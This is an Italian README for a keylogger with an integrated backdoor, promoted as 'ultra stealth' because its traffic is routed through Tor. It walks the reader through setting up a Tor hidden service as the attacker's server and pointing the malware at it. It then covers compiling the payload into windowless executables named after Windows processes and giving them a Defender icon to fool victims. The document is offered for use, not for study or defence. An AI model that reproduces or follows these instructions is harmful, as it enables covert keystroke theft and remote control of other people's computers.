--------------------------------------- TheHiddenWiredProject ---------------------------------------

Cosa è TheHiddenWiredProject?
TheHiddenWiredProject (THWP) è un keylogger con backdoor integrata pensato per essere ultra stealth
perchè tutto il traffico generato è instradato via Tor!

è safe?
Yeah bro, è 100% safe, il codice lo puoi modificare come vuoi senza problemi, mentre Tor ti aiuta
a nascondere il tuo server (serve per ascoltare il keylogger e usare la backdoor).

quindi devo configurare un server!?
Yeah, è necessario per avere un livello di anonimato abbastanza alto

è pronto all'uso?
assolutamente no, lo devi compilare tu, è ultra facile, continua a leggere che dopo lo spiego

lo consigli?
Assolutamente si! Questo tool è estremamente compatto, ma nello stesso tempo ultra stealth,
non troveresti mai un keylogger con una backdoor via Tor su internet!!

----------------------------------------------------------------------------------------------------

Passiamo alla teoria noiosa che è necessaria per configurare il server e compilare THWP

Partiamo dai requisiti necessari...

Un PC o una VM con linux (consiglio una distro debian-based come debian, ubuntu, mint.. ecc...)
Una connessione internet stabile (almeno 2Mbitps)

----------------------------------------------------------------------------------------------------
Creare e configurare il server Tor:

# Per evitare problemi diventa root con "sudo su"

# installa tor
sudo apt install tor

# modifica il file torrc
sudo nano /etc/tor/torrc

# Aggiungi le seguenti informazioni alla fine del file:

HiddenServiceDir /var/lib/tor/serverTHWP
HiddenServicePort 80 127.0.0.1:80

# La prima stringa "HiddenServiceDir" specifica dove tor andrà a salvare la config del server (NON METTERE DIRECTORY CUSTOM PER EVITARE PROBLEMI, LASCIALA COSÍ)
# La seconda stringa hosta sulla porta 80

# Adesso devi riavviare Tor per rendere effettive le modifiche
sudo systemctl restart tor

# Se hai dubbi vai su: https://community.torproject.org/onion-services/setup/
# Oppure chiedi a ChatGPT

# Adesso devi vedere il tuo dominio su tor, lo puoi vedere con:
cat /var/lib/tor/serverTHWP/hostname

# Per evitare problemi diventa root con "sudo su"

----------------------------------------------------------------------------------------------------

Adesso devi configurare TheHiddenWiredProject per fare in modo che indirizza il traffico verso il tuo dominio,
quindi modifica il file Isass.py, trova una variabile che si chiama "TARGET_ONION" (la trovi all'inizio),
e metti il tuo dominio (quello che finisce per .onion che hai trovato dentro il file hostname)

----------------------------------------------------------------------------------------------------

Adesso hai tutto pronto!! Puoi testare su una VM Windows il funzionamento, se tutto funziona puoi compilare tutto!!

Per compilare tutto é necessaria una macchina Windows, useremo nuitka per trasformare i notri file in python in eseguibili.

1) Installa Python nella macchina Windows (Non da MStore ma dal sito ufficiale)
2) Adesso apri il terminale e digita: pip install nuitka (SE PIP NON VIENE TROVATO RIAVVIA WINDOWS DOPO AVER INSTALLATO PYTHON!)
3) Adesso digita: nuitka --onefile --windows-disable-console file.py

# --onefile = unico file .exe
# --windows-disable-console = no prompt quando viene eseguito

4) Esegui nuitka per ogni file .py (Isass.py, WMIHost.py, wuasrvs.py)
5) Dopo aver compilato tutti i file py devi compilare SecurityHealthSystray.bat con Bat-To-Exe-Converter (Cercalo su internte)
6) Aggiungi l'icona di defender al file al compilatore per avere un .exe con l'icona di Defender
7) ----------------------------------------------------------------------------------------------------
